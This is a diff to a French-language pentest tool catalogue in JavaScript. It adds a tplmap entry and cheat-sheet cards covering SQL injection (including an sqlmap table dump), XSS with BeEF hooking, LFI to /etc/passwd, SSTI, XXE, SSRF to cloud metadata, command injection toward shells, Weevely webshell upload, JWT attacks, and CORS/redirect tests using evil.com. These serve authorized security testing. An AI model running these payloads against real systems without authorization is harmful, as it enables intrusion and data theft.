@@ -436,6 +436,8 @@ const TOOLS = [
     desc: "Scanner XSS rapide avec vérification des payloads réellement exécutés.", cmd: "dalfox url 'http://<ip>/?q=1'", tags: "xss scanner payload injection" },
   { name: "Commix", url: "https://github.com/commixproject/commix", cat: "web", platforms: ["linux"], phases: ["exploit"],
     desc: "Détection et exploitation automatisée des injections de commandes (OS command injection).", cmd: "commix -u 'http://<ip>/?p=1'", tags: "command injection rce web" },
+  { name: "tplmap", url: "https://github.com/epinna/tplmap", cat: "web", platforms: ["linux"], phases: ["exploit"],
+    desc: "Détection et exploitation automatisée des injections de template côté serveur (SSTI) — jusqu'au RCE.", cmd: "tplmap -u 'http://<ip>/?name=John'", tags: "ssti template injection jinja twig freemarker rce" },
   { name: "BeEF", url: "https://github.com/beefproject/beef", cat: "web", platforms: ["linux"], phases: ["exploit"],
     desc: "Framework d'exploitation du navigateur (hook XSS → contrôle du client).", tags: "xss navigateur hook client framework" },
   { name: "Weevely", url: "https://github.com/epinna/weevely3", cat: "web", platforms: ["linux"], phases: ["post"],
@@ -603,6 +605,115 @@ const CHEATS = [
       { tool: "Burp Suite", cmd: "Interception manuelle (Repeater/Intruder)" }
     ],
     note: "Si WordPress → WPScan. Repérer les consoles d'admin et tester les identifiants par défaut." },
+
+  /* ===== Attaques web par type de faille (OWASP WSTG) ===== */
+  { icon: "🧬", title: "Un paramètre a l'air injectable → injection SQL",
+    phase: "exploit",
+    steps: [
+      { tool: "Burp Suite", cmd: "Tester  '  \"  )  --   et observer erreurs / latence (Repeater)" },
+      { tool: "sqlmap", cmd: "sqlmap -u 'http://<ip>/page?id=1' --batch --dbs" },
+      { tool: "sqlmap", cmd: "sqlmap -u 'http://<ip>/page?id=1' -D <db> -T users --dump   # exfiltration" },
+      { tool: "PayloadsAllTheThings", cmd: "Dossier SQL Injection → bypass WAF, blind, time-based" }
+    ],
+    note: "Repérer union-based / error-based / blind (boolean & time). Tester aussi les injections dans les en-têtes, cookies et le corps POST." },
+
+  { icon: "✴️", title: "Une entrée est réfléchie dans la page → XSS",
+    phase: "exploit",
+    steps: [
+      { tool: "Burp Suite", cmd: "Injecter un marqueur unique, chercher où il ressort (reflected / stored / DOM)" },
+      { tool: "Dalfox", cmd: "dalfox url 'http://<ip>/?q=FUZZ'" },
+      { tool: "XSStrike", cmd: "xsstrike -u 'http://<ip>/?q=test'" },
+      { tool: "BeEF", cmd: "Hooker le navigateur de la victime après un XSS stocké" }
+    ],
+    note: "Le contexte dicte le payload (HTML, attribut, JS, URL). Tester reflected, stored et DOM. Voir PayloadsAllTheThings → XSS Injection." },
+
+  { icon: "📄", title: "Un paramètre charge un fichier (?file=, ?page=) → LFI / traversée",
+    phase: "exploit",
+    steps: [
+      { tool: "Burp Suite", cmd: "../../../../etc/passwd   et   php://filter/convert.base64-encode/resource=index.php" },
+      { tool: "ffuf", cmd: "ffuf -u 'http://<ip>/?file=FUZZ' -w lfi-wordlist.txt" },
+      { tool: "PayloadsAllTheThings", cmd: "Directory Traversal + File Inclusion (wrappers, log poisoning)" }
+    ],
+    note: "LFI → lecture (/etc/passwd, logs), voire RCE (log/session poisoning, filtres php). RFI si allow_url_include. Tester ../, encodages et null-byte." },
+
+  { icon: "🧩", title: "La page évalue une expression → SSTI (template injection)",
+    phase: "exploit",
+    steps: [
+      { tool: "Burp Suite", cmd: "Injecter  {{7*7}}  ${7*7}  <%= 7*7 %>  et voir si 49 s'affiche" },
+      { tool: "tplmap", cmd: "tplmap -u 'http://<ip>/?name=John'   # détection + RCE" },
+      { tool: "PayloadsAllTheThings", cmd: "Server Side Template Injection (Jinja2, Twig, Freemarker…)" }
+    ],
+    note: "Identifier le moteur via la charge qui fonctionne, puis escalader vers la lecture de fichiers / RCE." },
+
+  { icon: "📦", title: "L'appli parse du XML → XXE",
+    phase: "exploit",
+    steps: [
+      { tool: "Burp Suite", cmd: "<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]>  puis  &e;  dans le corps" },
+      { tool: "PayloadsAllTheThings", cmd: "XXE Injection → OOB, SSRF via XXE, lecture de fichiers" },
+      { tool: "CyberChef", cmd: "Encoder / décoder les charges et les sorties (base64)" }
+    ],
+    note: "Cibler les upload / SOAP / API qui acceptent du XML. Sans retour direct → XXE out-of-band (DTD externe hébergée)." },
+
+  { icon: "🛰️", title: "Le serveur va chercher une URL que je contrôle → SSRF",
+    phase: "exploit",
+    steps: [
+      { tool: "Burp Suite", cmd: "Remplacer l'URL par http://169.254.169.254/ (métadonnées cloud) ou http://127.0.0.1:<port>" },
+      { tool: "PayloadsAllTheThings", cmd: "Server Side Request Forgery → bypass de filtres, gopher://, redirections" },
+      { tool: "Nuclei", cmd: "nuclei -u http://<ip> -tags ssrf" }
+    ],
+    note: "Viser métadonnées cloud, services internes et ports locaux. Tester les schémas (file://, gopher://, dict://) et les contournements d'allowlist." },
+
+  { icon: "🪪", title: "Un identifiant d'objet dans l'URL/requête → IDOR",
+    phase: "exploit",
+    steps: [
+      { tool: "Burp Suite", cmd: "Incrémenter / décrémenter les id (user=1001→1002) via Repeater / Intruder" },
+      { tool: "Burp Suite", cmd: "Rejouer une action admin avec un compte standard (contrôle d'accès)" }
+    ],
+    note: "Tester horizontal (autre utilisateur) et vertical (privilèges). Vérifier UUID devinables, paramètres cachés et méthodes HTTP alternatives." },
+
+  { icon: "🧾", title: "Une action sensible sans anti-CSRF → CSRF",
+    phase: "exploit",
+    steps: [
+      { tool: "Burp Suite", cmd: "Engagement tools > Generate CSRF PoC, retirer le token et rejouer" },
+      { tool: "PayloadsAllTheThings", cmd: "CSRF → contournement de tokens, SameSite, requêtes JSON" }
+    ],
+    note: "Vérifier l'absence/validation du token, l'attribut SameSite des cookies et si un simple GET suffit. Confirmer avec un compte victime." },
+
+  { icon: "💥", title: "Un champ finit dans une commande OS → command injection",
+    phase: "exploit",
+    steps: [
+      { tool: "Burp Suite", cmd: "; id    | id    `id`    $(id)    && ping   # séparateurs de commande" },
+      { tool: "Commix", cmd: "commix -u 'http://<ip>/?p=1'   # détection + shell automatique" },
+      { tool: "PayloadsAllTheThings", cmd: "Command Injection → blind, time-based, exfiltration DNS" }
+    ],
+    note: "Si aveugle : time-based (sleep) ou OOB (DNS/HTTP). Enchaîner vers un reverse shell (voir le cas « reverse shell »)." },
+
+  { icon: "⬆️", title: "Je peux uploader un fichier → webshell",
+    phase: "exploit",
+    steps: [
+      { tool: "Weevely", cmd: "weevely generate <pass> shell.php   # webshell furtif" },
+      { tool: "Burp Suite", cmd: "Contourner le filtre : double extension, Content-Type, magic bytes, .phtml" },
+      { tool: "Weevely", cmd: "weevely http://<ip>/uploads/shell.php <pass>   # connexion au shell" }
+    ],
+    note: "Trouver le dossier d'upload accessible, contourner les filtres (extension / MIME / signature), puis exécuter. Sinon msfvenom pour d'autres langages." },
+
+  { icon: "🔑", title: "L'authentification utilise un JWT → attaques de token",
+    phase: "exploit",
+    steps: [
+      { tool: "jwt_tool", cmd: "python3 jwt_tool.py <token> -T   # explorer / altérer les claims" },
+      { tool: "jwt_tool", cmd: "python3 jwt_tool.py <token> -X a   # attaque alg=none" },
+      { tool: "jwt_tool", cmd: "python3 jwt_tool.py <token> -C -d rockyou.txt   # bruteforce du secret HS256" }
+    ],
+    note: "Tester alg=none, confusion RS256→HS256 (clé publique en secret), secret faible et claims modifiables (role/admin). Décoder avec CyberChef." },
+
+  { icon: "🔀", title: "Je teste les en-têtes et redirections → CORS / CRLF / open redirect",
+    phase: "exploit",
+    steps: [
+      { tool: "Burp Suite", cmd: "Origin: https://evil.com → voir si Access-Control-Allow-Origin le reflète (CORS)" },
+      { tool: "Burp Suite", cmd: "?next=https://evil.com   et   %0d%0aSet-Cookie:x=1   (open redirect / CRLF)" },
+      { tool: "Nuclei", cmd: "nuclei -u http://<ip> -tags cors,redirect" }
+    ],
+    note: "CORS permissif + credentials = vol de données. CRLF (%0d%0a) → injection d'en-têtes. Open redirect → chaînage SSRF / phishing / vol de token OAuth." },
 
   { icon: "🎯", title: "J'ai une version de service précise",
     phase: "vuln",
